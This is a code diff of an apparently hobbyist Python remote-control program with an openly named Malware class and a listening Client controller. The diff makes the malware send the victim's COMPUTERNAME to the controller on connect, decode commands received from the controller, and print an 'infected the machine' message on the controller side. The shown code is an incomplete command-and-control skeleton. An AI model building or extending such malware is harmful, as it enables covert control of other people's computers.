@@ -29,12 +29,14 @@ class Malware(Machine):
 
     def start(self):
         self.my_socket.connect(self.server_addr)
+        self.send(os.environ["COMPUTERNAME"])
 
-    def send(self, commande):
-        self.my_socket.send(commande.encode(self.language))
+    def send(self, message):
+        self.my_socket.send(str(message).encode(self.language))
 
     def receive(self):
-        return self.my_socket.recv(self.buffsize)
+        cmd = self.my_socket.recv(self.buffsize).decode(self.language)
+        return cmd
 
     def quit(self):
         self.my_socket.close()
@@ -53,13 +55,18 @@ class Client(Machine):
         self.my_socket.bind(self.server_addr)
         self.my_socket.listen()
 
-    def send(self, distant_socket, message):
-        distant_socket.send(message.encode(self.language))
+    def send(self, distant_socket, commande):
+        distant_socket.send(commande.encode(self.language))
 
     def receive(self, distant_socket):
-        print(distant_socket.recv(self.buffsize))
+        print(distant_socket.recv(self.buffsize).decode(self.language))
 
     def quit(self, distant_socket):
         distant_socket.close()
         self.my_socket.close()
         sys.exit()
+
+    def get_hostname(self, distant_socket):
+        hostname = distant_socket.recv(self.buffsize).decode(self.language)
+        print("The malware has infected the machine of : " + str(hostname))
+        return hostname
